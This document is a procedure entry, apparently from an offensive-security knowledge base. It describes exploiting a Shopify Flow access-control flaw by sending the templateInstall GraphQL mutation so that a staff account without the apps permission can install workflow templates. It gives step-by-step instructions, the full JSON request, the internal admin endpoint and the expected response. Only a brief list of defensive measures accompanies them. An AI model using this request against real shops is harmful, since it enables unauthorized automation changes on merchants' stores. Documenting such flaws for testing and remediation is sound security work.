---
id: 123e4567-e89b-12d3-a456-426614174003
name: Install-Workflow-Template-via-templateInstall
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.823Z'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - graphql-mutation
  - workflow-install
  - shopify
commands:
  - '[[commands/shopify-templateinstall-mutation]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---

# Install-Workflow-Template-via-templateInstall

## Summary

Executes the templateInstall GraphQL mutation to install a workflow template on the Shopify shop, bypassing required permissions and enabling unauthorized automation setup.

## Description

Using a discovered templateId, this mutation installs workflows like customer tagging on registration. The endpoint's lack of checks allows marketing staff to perform actions reserved for apps-permissioned users or Flow app installs.

## Requirements

1. Introspection-completed session
2. Known templateId (e.g., from testing or docs)
3. Burp Repeater with valid headers

## Defense

Defensive measures and detection strategies:

- Validate permissions per mutation in GraphQL resolvers
- Audit workflow installations for unauthorized sources
- Require explicit Flow app integration

## Objectives

1. Install template without apps permission
2. Obtain workflowId for activation
3. Demonstrate access control bypass

## Instructions

### Step 1: Prepare Mutation

**Context**: Set variables for the templateInstall mutation.

**Instructions**: Use templateId '977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f' and empty shopIds.

### Step 2: Execute [[commands/shopify-templateinstall-mutation]]

**Context**: Send the mutation via the vulnerable endpoint.

**Command** ([[commands/shopify-templateinstall-mutation]]):
```json
{"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":[]},"query":"mutation templateInstall($templateId: ID!, $shopIds: [ID!]!) {\n templateInstall(templateId: $templateId, shopIds: $shopIds) {\n installed {\n shopId\n workflowId\n workflowVersion\n __typename\n }\n errors {\n shopId\n message\n __typename\n }\n __typename\n }\n}\n"}
```

> Sends POST to /admin/internal/web/graphql/flow. Expected: {"data":{"templateInstall":{"installed":[{"shopId":"gid://shopify/Shop/10979704928","workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","workflowVersion":"acc5731a-7802-4622-857b-0191f8c0ee9d"}]}} or errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/shopify-templateinstall-mutation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[graphql-mutation]]
- [[workflow-install]]
- [[shopify]]
